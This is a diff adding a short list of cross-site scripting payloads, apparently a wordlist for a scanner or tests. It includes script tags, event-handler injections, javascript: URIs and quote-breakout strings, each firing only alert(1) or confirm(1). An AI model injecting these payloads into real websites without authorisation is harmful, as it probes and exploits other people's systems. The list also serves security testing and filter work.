@@ -1,0 +1,18 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+';alert(1);//
+<body onload=alert(1)>
+<iframe srcdoc='<script>alert(1)'></iframe>
+<math><mi><script>alert(1)</script></mi></math>
+<img src=x onerror=confirm(1)>
+<details open ontoggle=alert(1)>
+"><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<object data='javascript:alert(1)'></object>
+<video><source onerror=alert(1)></video>
+<input autofocus onfocus=alert(1)>
+<form action=javascript:alert(1)><input></form>
+'';!--"<XSS>=&{()}
+<script>setTimeout(()=>alert(1),0)</script>
+<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>
